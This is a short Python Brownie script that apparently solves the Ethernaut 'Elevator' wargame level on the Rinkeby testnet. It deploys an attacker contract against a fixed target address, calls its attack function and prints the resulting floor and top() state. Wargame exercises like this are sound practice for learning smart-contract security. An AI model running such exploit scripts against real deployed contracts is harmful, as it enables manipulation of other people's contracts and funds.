from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3, eth

import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x3F56e4DD8808934dCDa0F27A698d5360969c2662'
target_ct=interface.Elevator(target_address)

# # # # deploy target contract for dev
# target_ct=Elevator.deploy({'from': attacker, 'priority_fee': priority_fee})
# target_address=target_ct.address
target_floor=3

# deploy attacker contract
attacker_contract=elevatorAttack.deploy(target_address, target_floor, {'from': attacker, 'priority_fee': priority_fee})

def main():
    print('attacker_contract:', attacker_contract.address)
    print('target_address:', target_ct.address)

    tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee})

    print('tx_value:', tx.value)
    print('target floor:', target_ct.floor())
    print('check top() of target: ', target_ct.top())

    
